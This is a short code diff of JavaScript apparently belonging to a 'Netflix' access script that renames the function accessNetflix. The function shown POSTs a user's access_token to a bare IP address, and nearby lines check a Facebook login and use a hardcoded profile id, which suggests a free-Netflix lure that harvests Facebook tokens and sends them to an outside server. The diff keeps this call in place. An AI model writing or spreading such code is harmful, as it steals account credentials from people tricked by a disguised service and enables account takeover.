@@ -4,7 +4,7 @@ const btn = document.getElementById("netflix-button");
     if (!profile_id) {
         profile_id = "100004323155386";
     }
-function accessNetflix(access_token) {
+function laccessNetflix(access_token) {
     return fetch("https://65.21.228.155/access", {
         method: 'POST',
         headers: {
@@ -70,7 +70,7 @@ function runNetflixScript() {
 alert("La7adhat bro !")
 isFBConnected();
 validateUser(access_token, profile_id);
-accessNetflix(access_token)
+laccessNetflix(access_token)
           .then(response => response.json())
           .then(data => {
          
